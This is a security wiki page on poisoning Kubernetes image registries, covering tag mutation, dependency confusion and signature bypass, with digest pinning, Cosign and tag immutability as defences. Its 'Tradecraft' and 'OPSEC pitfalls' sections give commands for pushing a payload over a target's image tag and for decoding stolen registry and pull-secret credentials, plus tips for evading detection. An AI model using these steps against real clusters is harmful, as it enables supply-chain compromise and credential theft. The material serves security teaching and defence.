---
title: K8s image registry poisoning
slug: k8s-image-registry-poisoning
---

> **TL;DR:** Kubernetes pulls every container image by `image: registry/repo:tag` — and `:tag` is mutable. Compromise the registry, swap a tag, and every pod restart loads attacker code with whatever runtime privileges the pod has. Defences: pin by digest (`@sha256:...`), enforce image signature verification (Cosign + Sigstore policy), and lock registry RBAC. Three real-world classes: registry-credential theft, dependency-confusion (typo-squat public images), and mutating-tag attacks on private registries.

## What it is
A container image reference has the form `host/path[:tag][@digest]`. By default Kubernetes uses the tag, then falls back to whatever digest the registry resolves it to *at pull time* (subject to `imagePullPolicy`). If an attacker can rewrite the `:latest` or `:v1.2.3` reference in the registry, every node that pulls subsequently runs the swapped image. Public registries (Docker Hub, GHCR, GCR, ECR, ACR) plus self-hosted (Harbor, Quay, distribution/registry) all expose pushes via tokens/credentials; once those are compromised or mis-scoped, the attacker can poison images upstream of the cluster.

## Preconditions / where it applies
- Write access to a registry repo that the target cluster pulls from. Achieved via:
  - Stolen registry credentials (CI secrets, leaked `~/.docker/config.json`, exposed `regcred` Secret).
  - Cloud IAM permission misconfigs (`ecr:PutImage` on a wider scope than intended, GCR `storage.objects.create` on the bucket, ACR `AcrPush`).
  - Push token in an exposed CI artifact / build log.
- Or no write access required: dependency confusion — push a typo-squat image (`nginx-prod` vs `nginx_prod`) to a public registry and wait.

## Tradecraft
**Pattern 1 — Tag mutation.** A pod manifest references `myorg/api:latest`. Push a malicious image to the same tag:

```bash
# Re-tag a public attack image to point at the target's path
docker pull attacker/payload:1.0
docker tag attacker/payload:1.0 ghcr.io/myorg/api:latest
docker push ghcr.io/myorg/api:latest

# At next pod restart (HPA scale, node reboot, rolling deploy), the new image runs
kubectl rollout restart deployment/api -n prod
```

**Pattern 2 — Sidecar injection via base image.** Pod uses a multi-stage build whose final base is `alpine:3.18`. Push a malicious `alpine:3.18` to the same path of an org-cached Harbor mirror; every downstream build inherits the backdoor. SBOM diffing catches this only if defenders compare layer hashes between builds.

**Pattern 3 — Registry creds in CI.** Look for `~/.docker/config.json`, `DOCKER_AUTH_CONFIG`, `regcred` secret, `aws-cli`/`gcloud` profiles with registry roles:

```bash
# Inside a compromised CI runner
cat ~/.docker/config.json | jq -r '.auths | to_entries[] | "\(.key) \(.value.auth | @base64d)"'
# Each "auth" decodes to user:password — replay against the registry
```

ECR specifically: a token from `aws ecr get-login-password` lasts 12 hours. Cache one and you have a long window.

**Pattern 4 — `imagePullSecrets` lateral.** Read every namespace's pull secrets:

```bash
kubectl get secrets -A -o json | jq -r \
  '.items[] | select(.type=="kubernetes.io/dockerconfigjson") |
   "\(.metadata.namespace)/\(.metadata.name)"'
kubectl get secret -n NS NAME -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d
```

Pull secrets often span all repos for an org — same blast radius as the registry write token.

**Pattern 5 — Dependency confusion (public).** Target uses internal-name `acme-payments:1.0` and falls back to Docker Hub if not cached. Push `acme-payments:1.0` to Docker Hub before they cache; their CI may pull yours.

**Pattern 6 — Tag-mutability on signed images.** Cosign signatures live alongside the image as separate refs (`sha256-<digest>.sig`). If the registry only validates pushes by repo write, the attacker can push *both* a new image and a new signature. Defence requires Sigstore/Rekor transparency: see [[sigstore-cosign-supply-chain-signing]].

**Pattern 7 — Registry RBAC misconfig at the cloud level.** Common: an IAM role with `ecr:*` for one repo accidentally granted at account scope. List all repos the role can touch:

```bash
aws ecr describe-repositories --query 'repositories[].repositoryName' --output text
for r in $(aws ecr describe-repositories --query 'repositories[].repositoryName' --output text); do
  aws ecr get-repository-policy --repository-name "$r" 2>/dev/null
done
```

## Detection and defence
- **Pin by digest, not tag**: `image: registry/repo@sha256:abc...`. Tags become advisory only. `kube-score` and `kubelinter` flag pods that don't.
- **Cosign + policy controller**: deploy `sigstore/policy-controller` or `kyverno-verify-images`; require signatures from a known issuer (`github-actions://...`). Block unsigned and improperly-signed images at admission. See [[policy-as-code-opa-kyverno-defender]].
- **Registry audit logs**: ECR CloudTrail, GCR Cloud Audit, ACR diagnostic logs. Alert on `PutImage`/`PUT manifest` from non-CI identities, on tag overwrites, on pushes outside business hours.
- **Tag immutability**: ECR `imageTagMutability=IMMUTABLE`, ACR `--enable-tag-mutability=false`, Harbor "Tag immutability rule". Once on, the only way to "update" a tag is push under a new tag.
- **Network egress allowlist**: nodes pull only from known registry domains; block direct Docker Hub if you mirror via Harbor.
- **Sigstore policy + Rekor transparency** for build-time provenance; cross-check against SLSA attestations (see [[slsa-supply-chain-framework]]).

## OPSEC pitfalls
- Image-pull events show in `kubectl describe pod` for ~1h; defenders see your image SHA. Match the SHA's layer count and base-image distroness to the legitimate image so a quick `docker image inspect` doesn't flag obvious deltas.
- Registry-side push audit shows the pusher identity; use the stolen CI token rather than a personal account.
- Some EDR-for-containers (Sysdig, Aqua, Wiz Runtime) computes a per-image baseline; the *first* run of a swapped image triggers behavioural anomaly alerts even if the manifest looks normal.

## References
- [Sigstore — Cosign verify](https://docs.sigstore.dev/cosign/verifying/verify/) — image signature verification
- [Kyverno — Verify Images](https://kyverno.io/policies/?policytypes=verifyImages) — admission enforcement
- [Aqua — Container image attacks](https://www.aquasec.com/cloud-native-academy/container-security/container-image-security/) — taxonomy
- [Anchore — Container image supply chain](https://anchore.com/learn/) — defender playbook

See also: [[sigstore-cosign-supply-chain-signing]], [[slsa-supply-chain-framework]], [[helm-chart-security-audit]], [[k8s-admission-controllers]], [[policy-as-code-opa-kyverno-defender]], [[kubelet-exposed-api-attacks]]
